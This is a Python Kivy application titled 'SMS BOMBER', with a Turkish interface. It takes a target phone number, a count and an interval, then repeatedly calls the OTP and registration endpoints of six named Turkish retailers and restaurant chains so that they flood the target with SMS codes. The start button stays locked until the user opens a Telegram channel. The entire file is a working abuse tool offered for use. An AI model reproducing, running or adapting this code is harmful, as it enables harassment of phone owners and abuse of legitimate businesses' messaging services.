import kivy
import requests
import webbrowser
from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.image import Image
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.uix.gridlayout import GridLayout
from kivy.uix.behaviors import ButtonBehavior

kivy.require('2.0.0')

class ClickableImage(ButtonBehavior, Image):
    pass

class SmsApp(App):
    def build(self):
        Window.clearcolor = (1, 182/255, 193/255, 1)  
        self.root = BoxLayout()

        self.background = Image(source='background.png', allow_stretch=True, keep_ratio=False)
        self.root.add_widget(self.background)

        self.content = BoxLayout(orientation='vertical', spacing=10, padding=20, size_hint=(1, 1), pos_hint={"center_x": 0.5, "center_y": 0.5})
        self.content.add_widget(Label(text="SMS BOMBER", font_size=25, color=(1, 1, 1, 1)))
        self.content.add_widget(Label(text="maded by c4k1r", font_size=25, color=(1, 1, 1, 1)))

        self.phone_input = TextInput(hint_text="Telefon numarası", size_hint=(1, None), height=40)
        self.content.add_widget(self.phone_input)

        self.sms_count_input = TextInput(hint_text="Kaç SMS gönderilsin?", size_hint=(1, None), height=40, input_filter='int')
        self.content.add_widget(self.sms_count_input)

        self.sms_delay_input = TextInput(hint_text="Kaç saniyede bir SMS?", size_hint=(1, None), height=40, input_filter='float')
        self.content.add_widget(self.sms_delay_input)

        self.send_button = Button(text="Başlat", size_hint=(1, None), height=50, disabled=True)
        self.send_button.bind(on_press=self.start_sms)
        self.content.add_widget(self.send_button)

        self.stop_button = Button(text="Durdur", size_hint=(1, None), height=50)
        self.stop_button.bind(on_press=self.stop_sms)
        self.stop_button.disabled = True
        self.content.add_widget(self.stop_button)

        # Telegram butonu
        telegram_layout = GridLayout(cols=2, size_hint=(1, None), height=60, spacing=10)
        telegram_icon = ClickableImage(source="telegram.png")  # Telegram iconu
        telegram_icon.bind(on_press=self.enable_start_button)
        telegram_layout.add_widget(telegram_icon)

        telegram_text = Label(text="BAŞLATMAK İÇİN TELEGRAM GRUBUMUZA GİRMEİLİSİN", valign="middle", halign="left")
        telegram_text.bind(size=telegram_text.setter('text_size'))
        telegram_layout.add_widget(telegram_text)
        self.content.add_widget(telegram_layout)

        self.root.add_widget(self.content)
        self.telegram_joined = False  # Kullanıcı Telegram kanalına katıldığını kontrol etmek için
        return self.root

    def enable_start_button(self, instance):
        webbrowser.open("https://t.me/bloodarch")  # Telegram kanalına yönlendirme
        self.telegram_joined = True  # Telegram'a tıklandığında True yap

        # SMS başlatma butonunu aktif hale getir
        self.send_button.disabled = False 

    def start_sms(self, instance):
        if not self.telegram_joined:  # Eğer Telegram kanalına katılmadıysa
            self.show_popup("Hata", "Lütfen önce Telegram kanalımıza katılın.")
            return
        
        phone = self.phone_input.text.strip()
        try:
            self.total_sms = int(self.sms_count_input.text)
            self.delay = float(self.sms_delay_input.text)
        except ValueError:
            self.show_popup("Hata", "Lütfen tüm alanları doğru şekilde doldurun.")
            return

        if not phone or len(phone) < 10:
            self.show_popup("Hata", "Geçerli bir telefon numarası girin.")
            return

        self.phone = phone
        self.sms_sent = 0
        self.successful_sms = 0
        self.is_sending = True

        self.send_button.disabled = True
        self.stop_button.disabled = False
        self.sms_schedule = Clock.schedule_interval(self.send_sms, self.delay)

    def stop_sms(self, instance):
        if hasattr(self, 'sms_schedule'):
            Clock.unschedule(self.sms_schedule)
        self.is_sending = False
        self.send_button.disabled = False
        self.stop_button.disabled = True
        self.show_popup("Durdu", f"{self.successful_sms} SMS başarıyla gönderildi.")

    def send_sms(self, dt):
        if self.successful_sms >= self.total_sms:
            self.stop_sms(None)
            return

        success = False
        success |= self.sms_gonder_bim(self.phone)
        success |= self.sms_gonder_englishhome(self.phone)
        success |= self.sms_gonder_dominos(self.phone)
        success |= self.sms_gonder_kahvedunyasi(self.phone)
        success |= self.sms_gonder_koton(self.phone)
        success |= self.sms_gonder_komagene(self.phone)

        if success:
            self.successful_sms += 1
            print(f"[{self.successful_sms}/{self.total_sms}] SMS gönderildi.")
        else:
            print("Başarısız deneme.")

    def sms_gonder_bim(self, phone):
        try:
            url = "https://bim.veesk.net/service/v1.0/account/login"
            r = requests.post(url, json={"phone": phone}, timeout=5)
            return r.status_code == 200
        except:
            return False

    def sms_gonder_englishhome(self, phone):
        try:
            url = "https://www.englishhome.com/api/member/sendOtp"
            r = requests.post(url, json={"phone": phone}, timeout=5)
            return r.status_code == 200
        except:
            return False

    def sms_gonder_dominos(self, phone):
        try:
            url = "https://frontend.dominos.com.tr/api/customer/sendOtpCode"
            r = requests.post(url, headers={"Content-Type": "application/json;charset=utf-8"}, json={"mobilePhone": phone}, timeout=5)
            return r.status_code == 200
        except:
            return False

    def sms_gonder_kahvedunyasi(self, phone):
        try:
            url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
            r = requests.post(url, headers={"Content-Type": "application/json"}, json={"countryCode": "90", "phoneNumber": phone}, timeout=5)
            return r.json().get("processStatus") == "Success"
        except:
            return False

    def sms_gonder_koton(self, phone):
        try:
            url = "https://www.koton.com/users/register/"
            data = f"""--sCv.boundary\r
content-disposition: form-data; name="phone"\r
\r
0{phone}\r
--sCv.boundary--\r\n"""
            headers = {
                "Content-Type": "multipart/form-data; boundary=sCv.boundary",
                "X-Project-Name": "rn-env",
                "X-App-Type": "akinon-mobile"
            }
            r = requests.post(url, headers=headers, data=data, timeout=5)
            return r.status_code == 202
        except:
            return False

    def sms_gonder_komagene(self, phone):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            r = requests.post(url, json={"FirmaId": 32, "Telefon": phone}, timeout=5)
            return r.json().get("Success") == True
        except:
            return False

    def show_popup(self, title, message):
        popup = Popup(title=title,
                      content=Label(text=message),
                      size_hint=(None, None), size=(400, 200))
        popup.open()

if __name__ == '__main__':
    SmsApp().run()